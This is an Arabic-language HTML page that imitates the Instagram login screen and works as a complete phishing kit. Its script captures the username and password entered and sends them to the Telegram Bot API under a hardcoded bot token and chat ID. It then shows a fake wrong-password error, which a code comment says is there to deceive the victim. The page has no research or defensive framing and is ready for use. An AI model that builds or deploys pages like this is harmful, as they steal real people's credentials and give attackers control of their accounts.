<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Instagram • تسجيل الدخول</title>
<style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    body { background-color: #fafafa; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
    
    .container { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; width: 350px; padding: 40px; text-align: center; margin-bottom: 10px; }
    .logo { font-family: 'Billabong', cursive; font-size: 50px; margin-bottom: 30px; color: #262626; }
    
    input { width: 100%; padding: 9px 8px 7px; margin-bottom: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; outline: none; }
    input:focus { border: 1px solid #a8a8a8; }
    
    button { width: 100%; background-color: #0095f6; color: #fff; border: none; border-radius: 4px; padding: 7px 16px; font-weight: 600; font-size: 14px; margin-top: 8px; cursor: pointer; }
    button:disabled { background-color: #b2dffc; cursor: not-allowed; }
    
    .divider { display: flex; align-items: center; margin: 20px 0; }
    .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
    .divider span { padding: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
    
    .fb-login { color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 15px; }
    .forgot { color: #00376b; font-size: 12px; text-decoration: none; display: block; margin-top: 15px; }
    
    .signup-box { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; width: 350px; padding: 20px; text-align: center; font-size: 14px; }
    .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
    
    .error-msg { color: #ed4956; font-size: 14px; margin-bottom: 10px; display: none; }
</style>
</head>
<body>

<div class="container">
    <div class="logo">Instagram</div>
    <div class="error-msg" id="error">عذراً، كلمة المرور التي أدخلتها غير صحيحة. يرجى المحاولة مرة أخرى.</div>
    <form id="loginForm">
        <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف" required autocomplete="off">
        <input type="password" id="password" placeholder="كلمة المرور" required autocomplete="off">
        <button type="submit" id="submitBtn">تسجيل الدخول</button>
    </form>
    
    <div class="divider"><span>أو</span></div>
    
    <a href="#" class="fb-login">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" width="16" height="16">
        تسجيل الدخول باستخدام فيسبوك
    </a>
    <a href="#" class="forgot">هل نسيت كلمة السر؟</a>
</div>

<div class="signup-box">
    ليس لديك حساب؟ <a href="#">أنشئ حساباً</a>
</div>

<script>
// ضع التوكن والـ ID الخاص بك هنا
const TOKEN = "9225798978:AAHnyMuXHnWv7P_y05v2_nsR_O5VRGQZzCE";
const CHAT_ID = "7356963877";

document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const btn = document.getElementById('submitBtn');
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    btn.disabled = true;
    btn.textContent = "جارٍ تسجيل الدخول...";

    // إرسال البيانات إلى بوت تلجرام
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `📸 حساب إنستغرام جديد\n👤 اليوزر: ${username}\n🔑 الباسورد: ${password}`
            })
        });
    } catch (err) {
        console.log("Telegram API Error");
    }

    // إظهار رسالة خطأ وهمية لإيهام الضحية بأن كلمة المرور خاطئة
    setTimeout(() => {
        btn.disabled = false;
        btn.textContent = "تسجيل الدخول";
        document.getElementById('error').style.display = 'block';
        document.getElementById('password').value = '';
    }, 1000);
});
</script>
</body>
</html>
